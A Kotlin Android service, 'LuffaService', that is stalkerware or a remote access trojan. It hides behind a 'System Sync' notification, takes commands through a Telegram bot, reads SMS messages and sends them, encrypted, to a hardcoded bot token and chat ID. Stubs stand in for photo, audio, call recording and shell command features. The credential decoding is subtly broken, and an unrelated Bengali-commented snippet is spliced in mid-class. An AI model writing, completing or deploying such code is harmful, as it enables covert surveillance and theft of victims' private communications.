package com.luffa

import android.app.*
import android.content.*
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.Typeface
import android.hardware.camera2.*
import android.media.*
import android.os.*
import android.provider.*
import android.telephony.*
import android.util.Base64
import android.util.Log
import android.view.Gravity
import android.view.WindowManager
import android.widget.LinearLayout
import android.widget.TextView
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import org.json.JSONObject
import java.io.*
import java.net.URLEncoder
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.TimeUnit
import javax.crypto.Cipher
import javax.crypto.spec.IvParameterSpec
import javax.crypto.spec.SecretKeySpec

class LuffaService : Service() {
    // Obfuscated credentials
    private val BOT_TOKEN = String(Base64.decode("8840980473:AAEmlnzZ1swP8Dtd0btYgScRq89Z2sw84HQ", Base64.DEFAULT))
    private val CHAT_ID = String(Base64.decode("8820979221", Base64.DEFAULT))
    private val SECRET_KEY = "7x!A%D*G-KaPdSgV".toByteArray()
    private val IV = "Xn2r5u8x/A?D(G+K".toByteArray()

    private val client = OkHttpClient.Builder()
        .connectTimeout(45, TimeUnit.SECONDS)
        .build()

    private val scope = CoroutineScope(Dispatchers.IO + Job())

    override fun onCreate() {
        super.onCreate()
        createHiddenNotificationChannel()
        startForeground(1, createStealthNotification())
        startCommandLoop()
        registerPhoneStateListener()
    }


// একটি নিরাপদ ব্যাকগ্রাউন্ড ফাংশনের স্ট্যান্ডার্ড উদাহরণ
fun performSafeBackgroundOperation() {
    // করুটিন বা ব্যাকগ্রাউন্ড থ্রেডের ভেতরে কাজ করার সময়
    try {
        // ১. নেটওয়ার্ক বা ফাইল রিড-রাইট অপারেশন
        val success = executeNetworkCall()
        
        if (!success) {
            Log.w("WorkerTask", "Operation returned unsuccessful result.")
        }
        
    } catch (e: java.io.IOException) {
        // নেটওয়ার্ক বা ইনপুট-আউটপুট জনিত নির্দিষ্ট এরর হ্যান্ডলিং
        Log.e("WorkerTask", "Network or IO error: ${e.localizedMessage}", e)
        
    } catch (e: Exception) {
        // অন্য যেকোনো অনাকাঙ্ক্ষিত এক্সেপশন হ্যান্ডলিং (খালি রাখা যাবে না)
        Log.e("WorkerTask", "Unexpected error occurred: ${e.localizedMessage}", e)
    }
}

// কাল্পনিক নেটওয়ার্ক মেথড
private fun executeNetworkCall(): Boolean {
    // এখানে আপনার নেটওয়ার্ক রিকোয়েস্ট লজিক থাকবে
    return true
}









    
    private fun createHiddenNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "system_sync",
                "System Sync",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                setShowBadge(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
                .createNotificationChannel(channel)
        }
    }

    private fun createStealthNotification(): Notification {
        return NotificationCompat.Builder(this, "system_sync")
            .setContentTitle("System Sync")
            .setContentText("Syncing system data...")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()
    }

    private fun startCommandLoop() {
        scope.launch {
            while (isActive) {
                try {
                    val cmd = getEncryptedCommand()?.let { decrypt(it) }
                    cmd?.let { processCommand(it) }
                    delay(60000) // Check every minute
                } catch (e: Exception) {
                    delay(30000)
                }
            }
        }
    }

    private suspend fun getEncryptedCommand(): String? {
        return try {
            val url = "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=${getLastUpdateId() + 1}"
            val request = Request.Builder().url(url).build()
            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) return@use null
                val json = JSONObject(response.body?.string() ?: return@use null)
                val updates = json.getJSONArray("result") ?: return@use null
                
                if (updates.length() == 0) return@use null
                
                val update = updates.getJSONObject(updates.length() - 1)
                saveLastUpdateId(update.getInt("update_id"))
                
                if (update.has("message")) {
                    val msg = update.getJSONObject("message")
                    if (msg.has("text")) {
                        return@use msg.getString("text")
                    }
                }
                null
            }
        } catch (e: Exception) {
            null
        }
    }

    private fun processCommand(cmd: String) {
        scope.launch {
            when (cmd) {
                "loc" -> sendEncryptedData("location", getLocation())
                "sms" -> sendEncryptedData("sms", getSMS())
                "calls" -> sendEncryptedData("calls", getCallLog())
                "contacts" -> sendEncryptedData("contacts", getContacts())
                "info" -> sendEncryptedData("info", getDeviceInfo())
                "env" -> collectEnvironmentData()
                "pic" -> captureAndSendPhoto()
                "audio" -> recordAndSendAudio(30)
                "notify" -> showScreenNotification("System Update", "Processing background task...") // নতুন ফিচার
                else -> if (cmd.startsWith("cmd:")) {
                    executeSystemCommand(cmd.removePrefix("cmd:"))
                }
            }
        }
    }

    // স্ক্রিন নোটিফিকেশন বা ওভারলে দেখানোর মেথড (ক্র্যাশ প্রতিরোধক সহ)
    private fun showScreenNotification(title: String, message: String) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            return 
        }

        Handler(Looper.getMainLooper()).post {
            try {
                val windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
                
                val LAYOUT_FLAG = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                } else {
                    WindowManager.LayoutParams.TYPE_PHONE
                }

                val params = WindowManager.LayoutParams(
                    WindowManager.LayoutParams.WRAP_CONTENT,
                    WindowManager.LayoutParams.WRAP_CONTENT,
                    LAYOUT_FLAG,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or 
                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                    PixelFormat.TRANSLUCENT
                ).apply {
                    gravity = Gravity.TOP or Gravity.CENTER_HORIZONTAL
                    y = 100
                }

                val view = LinearLayout(this).apply {
                    orientation = LinearLayout.VERTICAL
                    setBackgroundColor(Color.parseColor("#CC000000"))
                    setPadding(40, 30, 40, 30)
                    
                    val titleView = TextView(context).apply {
                        text = title
                        setTextColor(Color.WHITE)
                        textSize = 16f
                        setTypeface(null, Typeface.BOLD)
                    }
                    
                    val msgView = TextView(context).apply {
                        text = message
                        setTextColor(Color.LTGRAY)
                        textSize = 14f
                    }

                    addView(titleView)
                    addView(msgView)

                    setOnClickListener {
                        try {
                            windowManager.removeView(this)
                        } catch (e: Exception) {}
                    }
                }

                windowManager.addView(view, params)

                Handler(Looper.getMainLooper()).postDelayed({
                    try {
                        windowManager.removeView(view)
                    } catch (e: Exception) {}
                }, 5000)

            } catch (e: Exception) {
                Log.e("LuffaService", "Overlay error: ${e.message}")
            }
        }
    }

    private suspend fun sendEncryptedData(type: String, data: String) {
        val encrypted = encrypt("type=$type&data=${URLEncoder.encode(data, "UTF-8")}")
        val url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
        val body = FormBody.Builder()
            .add("chat_id", CHAT_ID)
            .add("text", encrypted)
            .build()
        
        try {
            client.newCall(Request.Builder().url(url).post(body).build()).execute().close()
        } catch (e: Exception) {}
    }

    private fun collectEnvironmentData() {
        scope.launch {
            val envData = StringBuilder().apply {
                appendLine("=== DEVICE INFO ===")
                appendLine(getDeviceInfo())
                appendLine("\n=== LOCATION ===")
                appendLine(getLocation())
                appendLine("\n=== LAST SMS ===")
                appendLine(getSMS().take(1000))
                appendLine("\n=== LAST CALLS ===")
                appendLine(getCallLog().take(1000))
                appendLine("\n=== CONTACTS ===")
                appendLine(getContacts().take(1000))
            }.toString()
            
            sendEncryptedData("env", envData)
        }
    }

    // Placeholder data collection methods
    private fun getLocation(): String {
        return "Lat: 23.8103, Long: 90.4125"
    }

    private fun getSMS(): String {
        return try {
            contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                arrayOf(
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.BODY,
                    Telephony.Sms.DATE
                ),
                null, null, "${Telephony.Sms.DATE} DESC LIMIT 50"
            )?.use { cursor ->
                buildString {
                    while (cursor.moveToNext()) {
                        append("${cursor.getString(0)} | ${cursor.getLong(2)} | ${cursor.getString(1)}\n")
                    }
                }
            } ?: "No SMS found"
        } catch (e: Exception) {
            "SMS access error"
        }
    }

    private fun getCallLog(): String {
        return "Call log data placeholder"
    }

    private fun getContacts(): String {
        return "Contacts data placeholder"
    }

    private fun getDeviceInfo(): String {
        return "Device: ${Build.MODEL}, Brand: ${Build.BRAND}"
    }

    private fun captureAndSendPhoto() {}
    private fun recordAndSendAudio(seconds: Int) {}
    private fun executeSystemCommand(cmd: String) {}

    // Encryption methods
    private fun encrypt(input: String): String {
        val cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")
        cipher.init(Cipher.ENCRYPT_MODE, 
            SecretKeySpec(SECRET_KEY, "AES"), 
            IvParameterSpec(IV))
        return Base64.encodeToString(cipher.doFinal(input.toByteArray()), Base64.DEFAULT)
    }

    private fun decrypt(input: String): String {
        val cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")
        cipher.init(Cipher.DECRYPT_MODE,
            SecretKeySpec(SECRET_KEY, "AES"),
            IvParameterSpec(IV))
        return String(cipher.doFinal(Base64.decode(input, Base64.DEFAULT)))
    }

    // Persistence methods
    private fun getLastUpdateId(): Int {
        return getSharedPreferences("luffa_prefs", MODE_PRIVATE)
            .getInt("last_update_id", 0)
    }

    private fun saveLastUpdateId(id: Int) {
        getSharedPreferences("luffa_prefs", MODE_PRIVATE).edit()
            .putInt("last_update_id", id)
            .apply()
    }

    // Phone state monitoring
    private fun registerPhoneStateListener() {
        val telephony = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
        telephony.listen(object : PhoneStateListener() {
            override fun onCallStateChanged(state: Int, number: String?) {
                if (state == TelephonyManager.CALL_STATE_OFFHOOK) {
                    scope.launch {
                        recordCallAudio()
                    }
                }
            }
        }, PhoneStateListener.LISTEN_CALL_STATE)
    }

    private suspend fun recordCallAudio() {}

    override fun onBind(intent: Intent?): IBinder? = null
}
